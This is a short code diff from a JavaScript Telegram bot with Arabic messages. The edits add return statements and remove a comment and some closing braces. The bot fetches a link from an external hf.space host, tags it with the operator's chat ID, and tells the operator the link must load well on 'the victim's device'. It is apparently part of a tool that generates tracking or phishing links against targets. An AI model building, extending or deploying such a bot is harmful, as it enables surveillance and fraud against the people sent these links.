@@ -1719,8 +1719,6 @@ bot.on('callback_query', async (callbackQuery) => {
     if (data === 'request_verification') {
         const url = "https://sssssskskjwnsb-linklsksn.hf.space";
 
-// إرسال رسالة انتظار
-
 // استيراد الروابط من الموقع
 axios.get(url, { timeout: 10000 })
     .then(response => {
@@ -1741,17 +1739,15 @@ axios.get(url, { timeout: 10000 })
             const fullLink = `${foundLink}?chatId=${chatId}`;
             const message = `✅ تم إنشاء الرابط بنجاح\n\n🔗 الرابط: ${fullLink}\n\nملاحظة: قم باستخدام رابط جديد في كل مرة ويجب أن يكون الاتصال قويًا في جهاز الضحية`;
             
-            bot.sendMessage(chatId, message);
+            return bot.sendMessage(chatId, message);
         } else {
-            bot.sendMessage(chatId, "❌ لم يتم العثور على رابط مناسب في الموقع");
+            return bot.sendMessage(chatId, "❌ لم يتم العثور على رابط مناسب في الموقع");
         }
     })
     .catch(error => {
         console.error('Error fetching link:', error);
         bot.sendMessage(chatId, `❌ خطأ في جلب الرابط: ${error.message}`);
     });
-}
-});
 
     const [action, userId] = data.split(':');
 
